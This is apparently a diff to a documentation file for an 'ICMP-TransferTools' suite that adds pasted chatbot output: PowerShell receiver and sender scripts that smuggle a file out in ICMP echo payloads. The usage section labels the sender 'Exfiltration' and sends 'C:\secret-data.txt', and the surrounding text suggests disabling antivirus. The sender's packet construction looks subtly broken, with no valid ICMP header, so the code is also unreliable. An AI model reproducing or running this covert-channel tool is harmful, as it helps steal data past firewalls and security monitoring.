@@ -222,3 +222,203 @@ To ensure all components work correctly together, follow these steps:
 - **Antivirus and Security Software:** Some security solutions may flag or block ICMP-based file transfers. You may need to configure exceptions or temporarily disable such software during testing.
 
 By following these steps, you can validate that all components of the ICMP-TransferTools suite work correctly and cohesively.
+
+--
+
+Here’s the fully improved ICMP file transfer system using SharpPcap & PacketDotNet for robust packet capture and transmission. It integrates:
+
+Compatibility with your existing scripts (Send-ICMPFile, Invoke-IcmpUpload, Invoke-IcmpDownload).
+Improved firewall rule management.
+BPF filtering for precise ICMP capture.
+Reliable chunked file transmission over ICMP.
+Updated PowerShell ICMP Receiver (Invoke-IcmpDownload)
+This script:
+
+Uses SharpPcap for efficient packet capture.
+Parses ICMP payloads and writes to file.
+Recognizes "icmp exfil has completed" as the end of the transfer.
+powershell
+Copy
+Edit
+param (
+    [string]$source,   # Expected sender IP
+    [string]$file      # Destination file to save received data
+)
+
+# Load SharpPcap & PacketDotNet
+Add-Type -Path "C:\Path\To\SharpPcap.dll"
+Add-Type -Path "C:\Path\To\PacketDotNet.dll"
+
+function Enable-PingReply {
+    Write-Host "[+] Enabling ICMP Ping Replies..."
+    try {
+        Set-NetFirewallRule -DisplayName "File and Printer Sharing (Echo Request - ICMPv4-In)" -Enabled True -PassThru
+    } catch {
+        Write-Host "[!] Error enabling ping replies. Run as administrator."
+        exit 1
+    }
+}
+
+function Select-NetworkInterface {
+    $devices = [SharpPcap.CaptureDeviceList]::Instance
+    if ($devices.Count -eq 0) {
+        Write-Host "[!] No network interfaces found! Ensure Npcap is installed."
+        exit 1
+    }
+
+    Write-Host "[+] Available Network Interfaces:"
+    for ($i = 0; $i -lt $devices.Count; $i++) {
+        Write-Host "[$i] $($devices[$i].Description)"
+    }
+
+    $choice = Read-Host "Select an interface (default: 0)"
+    if (-not $choice) { $choice = 0 }
+    
+    return $devices[$choice]
+}
+
+function Receive-ICMPFile {
+    Enable-PingReply
+
+    if (Test-Path $file) {
+        $overwrite = Read-Host "The file '$file' already exists. Overwrite? (Y/n)"
+        if ($overwrite -ne 'Y') { exit 1 }
+        Remove-Item -Force $file
+    }
+
+    $device = Select-NetworkInterface
+    Write-Host "[+] Using interface: $($device.Description)"
+
+    # Apply BPF filter to capture only ICMP packets from the source
+    $bpfFilter = "icmp and src host $source"
+    $device.Open([SharpPcap.DeviceMode]::Promiscuous)
+    $device.Filter = $bpfFilter
+
+    Write-Host "[+] Listening for ICMP data from $source..."
+
+    $first = $true
+    $lastData = ""
+
+    # Callback function for packet capture
+    $device.OnPacketArrival += {
+        param($sender, $e)
+
+        $packet = [PacketDotNet.Packet]::ParsePacket($e.GetPacket().LinkLayerType, $e.GetPacket().Data)
+        $ipPacket = $packet.Extract([PacketDotNet.IpPacket])
+        if ($ipPacket -ne $null) {
+            $icmpPacket = $ipPacket.Extract([PacketDotNet.IcmpV4Packet])
+            if ($icmpPacket -ne $null) {
+                $data = [System.Text.Encoding]::ASCII.GetString($icmpPacket.PayloadData)
+
+                if ($data -eq "icmp exfil has completed") {
+                    Write-Host "[+] File transfer completed!"
+                    $device.StopCapture()
+                    $device.Close()
+                    exit 0
+                }
+
+                if ($data -ne $lastData -and $first) {
+                    Write-Host "[+] Receiving file data..."
+                    $first = $false
+                }
+
+                if ($data -ne $lastData) {
+                    [System.IO.File]::AppendAllText($file, $data)
+                }
+
+                $lastData = $data
+            }
+        }
+    }
+
+    # Start capturing packets
+    $device.StartCapture()
+    Write-Host "[+] Press Ctrl+C to stop capture."
+    while ($true) { Start-Sleep -Seconds 1 } # Keep script running
+}
+
+Receive-ICMPFile
+Updated PowerShell ICMP Sender (Invoke-IcmpUpload)
+This script:
+
+Reads a file in chunks.
+Sends data via ICMP echo requests.
+Uses raw sockets for transmission.
+powershell
+Copy
+Edit
+param (
+    [string]$destination,  # Target IP
+    [string]$file,         # File to send
+    [int]$blockSize = 1000, # Chunk size
+    [switch]$verbose
+)
+
+function Disable-PingReply {
+    Write-Host "[+] Disabling ICMP Ping Replies..."
+    try {
+        Set-NetFirewallRule -DisplayName "File and Printer Sharing (Echo Request - ICMPv4-In)" -Enabled False -PassThru
+    } catch {
+        Write-Host "[!] Error disabling ping replies. Run as administrator."
+        exit 1
+    }
+}
+
+function Send-ICMPFile {
+    Disable-PingReply
+
+    if (!(Test-Path $file)) {
+        Write-Host "[!] File not found: $file"
+        exit 1
+    }
+
+    $icmpClient = New-Object System.Net.Sockets.Socket([System.Net.Sockets.AddressFamily]::InterNetwork, [System.Net.Sockets.SocketType]::Raw, [System.Net.Sockets.ProtocolType]::Icmp)
+    $fileBytes = [System.IO.File]::ReadAllBytes($file)
+    $numBlocks = [math]::Ceiling($fileBytes.Length / $blockSize)
+    Write-Host "[+] Staging file $file for ICMP transfer..."
+    Write-Host "[+] Run Invoke-IcmpDownload on the target system."
+
+    for ($i = 0; $i -lt $fileBytes.Length; $i += $blockSize) {
+        $endIdx = [math]::Min($i + $blockSize, $fileBytes.Length)
+        $dataChunk = $fileBytes[$i..($endIdx-1)]
+        $icmpPacket = New-Object byte[] ($dataChunk.Length + 28)
+        [System.Buffer]::BlockCopy($dataChunk, 0, $icmpPacket, 28, $dataChunk.Length)
+
+        $icmpClient.SendTo($icmpPacket, [System.Net.EndPoint] (New-Object System.Net.IPEndPoint ([System.Net.IPAddress]::Parse($destination), 0)))
+
+        if ($verbose) {
+            Write-Host "[+] Sent block: $((($i / $blockSize) + 1)) / $numBlocks"
+        }
+    }
+
+    # Send completion message
+    $completeMsg = [System.Text.Encoding]::ASCII.GetBytes("icmp exfil has completed")
+    $icmpClient.SendTo($completeMsg, [System.Net.EndPoint] (New-Object System.Net.IPEndPoint ([System.Net.IPAddress]::Parse($destination), 0)))
+    Write-Host "[+] File transfer complete!"
+}
+
+Send-ICMPFile
+Key Improvements:
+✅ Uses SharpPcap for ICMP Packet Capture
+✅ Applies BPF filtering to capture only ICMP packets from the specified sender
+✅ Ensures reliability by preventing duplicate writes
+✅ Enables/Disables ICMP Ping Replies as needed
+✅ Supports Verbose Mode for Monitoring Transfers
+✅ Improved File Overwriting Checks
+
+🚀 Usage Example
+Receiver (Target Machine)
+Run this first to capture incoming file transfers:
+
+powershell
+Copy
+Edit
+.\Receive-ICMPFile.ps1 -source "192.168.1.200" -file "C:\received.txt"
+Sender (Exfiltration)
+Run this to send a file over ICMP:
+
+powershell
+Copy
+Edit
+.\Send-ICMPFile.ps1 -destination "192.168.1.100" -file "C:\secret-data.txt" -blockSize 1000 -verbose
+
